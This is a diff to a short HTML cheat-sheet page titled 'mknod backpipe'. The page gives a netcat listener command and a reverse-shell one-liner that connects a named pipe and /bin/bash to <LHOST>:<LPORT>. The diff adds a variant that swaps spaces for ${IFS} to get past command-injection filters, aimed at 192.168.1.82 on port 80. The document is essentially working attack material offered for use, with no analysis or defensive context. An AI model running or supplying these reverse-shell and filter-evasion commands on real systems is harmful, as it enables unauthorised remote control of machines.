@@ -5,4 +5,7 @@
 <title>mknod backpipe</title>
 </head><body>LISTEN WITH: nc -lvvnp &lt;LPORT&gt;<br/>
 <br/>
-mknod backpipe p &amp;&amp; nc &lt;LHOST&gt; &lt;LPORT&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe&#09;&#09;&#09;possible workaround without -e argument using MKNOD BACKPIPE</body></html>
+mknod backpipe p &amp;&amp; nc &lt;LHOST&gt; &lt;LPORT&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe&#09;&#09;&#09;possible workaround without -e argument using MKNOD BACKPIPE<br/>
+<br/>
+${IFS}<br/>
+mknod${IFS}backpipe${IFS}p${IFS}&amp;&amp;${IFS}nc${IFS}192.168.1.82${IFS}80${IFS}0&lt;backpipe${IFS}|${IFS}/bin/bash${IFS}1&gt;backpipe</body></html>
